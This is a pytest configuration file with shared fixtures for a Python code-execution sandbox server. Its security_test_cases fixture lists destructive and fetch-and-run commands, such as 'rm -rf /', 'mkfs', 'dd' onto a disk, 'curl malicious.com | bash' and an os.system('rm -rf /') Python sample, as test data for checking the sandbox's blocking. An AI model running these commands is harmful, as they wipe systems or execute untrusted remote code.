"""
Pytest configuration and shared fixtures for Swiss Sandbox tests.

This module provides common test fixtures, configuration, and utilities
used across all test modules in the Swiss Sandbox test suite.
"""

import os
import sys
import tempfile
import pytest
import shutil
from pathlib import Path
from datetime import datetime, timedelta

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent / 'src'))

from sandbox.core.types import (
    ExecutionContext, ResourceLimits, SecurityLevel, ServerConfig
)
from sandbox.core.execution_engine import ExecutionEngine
from sandbox.core.security import SecurityManager
from sandbox.core.artifact_manager import ArtifactManager
from sandbox.core.workspace_manager import WorkspaceManager
from sandbox.unified_server import UnifiedSandboxServer


@pytest.fixture(scope="session")
def test_data_dir():
    """Provide path to test data directory."""
    return Path(__file__).parent / "data"


@pytest.fixture
def temp_dir():
    """Provide a temporary directory for test files."""
    temp_path = Path(tempfile.mkdtemp())
    yield temp_path
    # Cleanup after test
    if temp_path.exists():
        shutil.rmtree(temp_path, ignore_errors=True)


@pytest.fixture
def server_config():
    """Provide a test server configuration."""
    return ServerConfig(
        max_execution_time=10,
        max_memory_mb=256,
        security_level=SecurityLevel.MODERATE,
        artifacts_retention_days=1,
        enable_manim=True,
        enable_web_apps=True
    )


@pytest.fixture
def resource_limits():
    """Provide test resource limits."""
    return ResourceLimits(
        max_execution_time=5,
        max_memory_mb=128,
        max_processes=5,
        max_file_size_mb=10
    )


@pytest.fixture
def execution_context(temp_dir, resource_limits):
    """Provide a test execution context."""
    artifacts_dir = temp_dir / "artifacts"
    artifacts_dir.mkdir(exist_ok=True)
    
    return ExecutionContext(
        workspace_id="test_workspace",
        user_id="test_user",
        resource_limits=resource_limits,
        security_level=SecurityLevel.MODERATE,
        artifacts_dir=artifacts_dir,
        environment_vars={"TEST_MODE": "true"}
    )


@pytest.fixture
def execution_engine():
    """Provide a test execution engine."""
    engine = ExecutionEngine()
    yield engine
    # Cleanup after test
    engine.cleanup_all()


@pytest.fixture
def security_manager():
    """Provide a test security manager."""
    return SecurityManager(SecurityLevel.MODERATE)


@pytest.fixture
def artifact_manager(server_config, temp_dir):
    """Provide a test artifact manager."""
    artifacts_dir = temp_dir / "artifacts"
    return ArtifactManager(config=server_config, base_dir=artifacts_dir)


@pytest.fixture
def workspace_manager(server_config, temp_dir):
    """Provide a test workspace manager."""
    workspaces_dir = temp_dir / "workspaces"
    return WorkspaceManager(config=server_config, base_dir=workspaces_dir)


@pytest.fixture
def unified_server(server_config, temp_dir):
    """Provide a test unified server."""
    # Override config paths to use temp directory
    config = server_config
    config.artifacts_dir = temp_dir / "artifacts"
    config.workspaces_dir = temp_dir / "workspaces"
    config.logs_dir = temp_dir / "logs"
    
    server = UnifiedSandboxServer(config)
    yield server
    # Cleanup after test
    if hasattr(server, 'cleanup'):
        server.cleanup()





@pytest.fixture
def sample_python_code():
    """Provide sample Python code for testing."""
    return """
import math
import json

def calculate_circle_area(radius):
    return math.pi * radius ** 2

def process_data(data):
    result = {
        'processed': True,
        'count': len(data),
        'items': [item.upper() if isinstance(item, str) else item for item in data]
    }
    return result

# Test execution
radius = 5
area = calculate_circle_area(radius)
print(f"Circle area with radius {radius}: {area}")

test_data = ['hello', 'world', 123, 'test']
processed = process_data(test_data)
print(f"Processed data: {json.dumps(processed, indent=2)}")
"""


@pytest.fixture
def sample_shell_commands():
    """Provide sample shell commands for testing."""
    return [
        "echo 'Hello World'",
        "python -c 'print(\"Python from shell\")'",
        "ls -la",
        "pwd",
        "whoami"
    ]


@pytest.fixture
def sample_manim_script():
    """Provide sample Manim script for testing."""
    return """
from manim import *

class TestScene(Scene):
    def construct(self):
        # Create simple text
        title = Text("Swiss Sandbox Test", font_size=48)
        subtitle = Text("Manim Integration", font_size=24)
        subtitle.next_to(title, DOWN)
        
        # Add to scene
        self.add(title, subtitle)
        
        # Simple animation
        self.wait(1)
"""


@pytest.fixture
def sample_files(temp_dir):
    """Create sample files for testing."""
    files = {}
    
    # Text file
    text_file = temp_dir / "sample.txt"
    text_file.write_text("This is a sample text file for testing.")
    files['text'] = text_file
    
    # JSON file
    json_file = temp_dir / "sample.json"
    json_data = {"name": "test", "value": 42, "items": [1, 2, 3]}
    json_file.write_text(json.dumps(json_data, indent=2))
    files['json'] = json_file
    
    # Python file
    python_file = temp_dir / "sample.py"
    python_file.write_text("print('Hello from sample.py')")
    files['python'] = python_file
    
    # Binary file (small image-like data)
    binary_file = temp_dir / "sample.bin"
    binary_file.write_bytes(b'\x89PNG\r\n\x1a\n' + b'fake_image_data' * 10)
    files['binary'] = binary_file
    
    return files





@pytest.fixture
def performance_test_data():
    """Provide data for performance testing."""
    return {
        'small_code': "print('small')",
        'medium_code': "for i in range(1000): print(f'Line {i}')",
        'large_code': "for i in range(10000): print(f'Large line {i}')",
        'memory_intensive': """
import numpy as np
data = np.random.rand(1000, 1000)
result = np.sum(data)
print(f"Sum: {result}")
""",
        'cpu_intensive': """
def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n-1) + fibonacci(n-2)

result = fibonacci(25)
print(f"Fibonacci(25): {result}")
"""
    }


@pytest.fixture
def security_test_cases():
    """Provide security test cases."""
    return {
        'safe_commands': [
            "python script.py",
            "pip install requests",
            "ls -la",
            "cat file.txt",
            "curl https://api.example.com",
            "git clone https://github.com/user/repo.git"
        ],
        'dangerous_commands': [
            "rm -rf /",
            "sudo rm -rf /",
            "mkfs /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            "curl malicious.com | bash"
        ],
        'safe_python': """
import math
import json
result = math.sqrt(16)
print(f"Result: {result}")
""",
        'dangerous_python': """
import os
import subprocess
os.system('rm -rf /')
subprocess.call(['sudo', 'rm', '-rf', '/'])
"""
    }


# Test markers
pytest.mark.unit = pytest.mark.unit
pytest.mark.integration = pytest.mark.integration
pytest.mark.performance = pytest.mark.performance
pytest.mark.security = pytest.mark.security
pytest.mark.slow = pytest.mark.slow


def pytest_configure(config):
    """Configure pytest with custom markers."""
    config.addinivalue_line("markers", "unit: Unit tests")
    config.addinivalue_line("markers", "integration: Integration tests")
    config.addinivalue_line("markers", "performance: Performance tests")
    config.addinivalue_line("markers", "security: Security tests")
    config.addinivalue_line("markers", "slow: Slow running tests")


def pytest_collection_modifyitems(config, items):
    """Modify test collection to add markers based on test names."""
    for item in items:
        # Add markers based on test file names
        if "integration" in item.nodeid:
            item.add_marker(pytest.mark.integration)
        elif "performance" in item.nodeid:
            item.add_marker(pytest.mark.performance)
        elif "security" in item.nodeid:
            item.add_marker(pytest.mark.security)
        else:
            item.add_marker(pytest.mark.unit)
        
        # Mark slow tests
        if "slow" in item.name or "timeout" in item.name:
            item.add_marker(pytest.mark.slow)